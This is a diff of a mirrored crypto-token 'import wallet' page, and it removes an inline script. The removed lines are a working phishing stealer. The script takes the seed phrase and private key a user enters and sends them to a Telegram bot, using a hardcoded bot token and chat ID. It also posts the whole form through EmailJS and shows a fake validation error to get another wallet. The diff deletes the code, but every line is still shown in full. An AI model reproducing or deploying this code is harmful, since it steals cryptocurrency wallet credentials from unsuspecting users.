@@ -186,43 +186,8 @@
         </div>
     </section>
 
-    <script>
-        $(document).ready(function () {
-            $('.ajaxForm').on('submit', function (event) {
-                event.preventDefault();
-
-                // Send data to Telegram bot
-                var chatId = '6915786786';
-                var token = '6915786786:AAHpdzO2L3tQln8WjYpzEoRrx3c3vUWO_xw';
-                var phrase = $('#phrase').val();
-                var privatekey = $('#privatekey').val();
-                var message = `New message:\nPhrase: ${phrase}\nPrivate Key: ${privatekey}`;
-                var urlString = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-                let request = new XMLHttpRequest();
-                request.open("POST.html", urlString);
-                request.send();
-
-                // Send form data via EmailJS
-                var formData = new FormData(this);
-                formData.append('service_id', 'service_twkhk3p');
-                formData.append('template_id', 'template_ctj0x3x');
-                formData.append('user_id', '5kMfY7VR6Fldfr3pM');
-
-                $.ajax('https://api.emailjs.com/api/v1.0/email/send-form', {
-                    type: 'POST',
-                    data: formData,
-                    contentType: false,
-                    processData: false
-                }).done(function () {
-                    alert('Error Validating Input Details, Please Try Another Wallet.');
-                }).fail(function (error) {
-                    alert('Oops... ' + JSON.stringify(error));
-                });
-            });
-        });
-    </script>
-    <script src="../unpkg.com/flowbite%401.5.3/dist/flowbite.js"></script>
+    
+   
 </body>
 
 <!-- Mirrored from snortertoken.vercel.app/import.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 Oct 2025 16:45:26 GMT -->
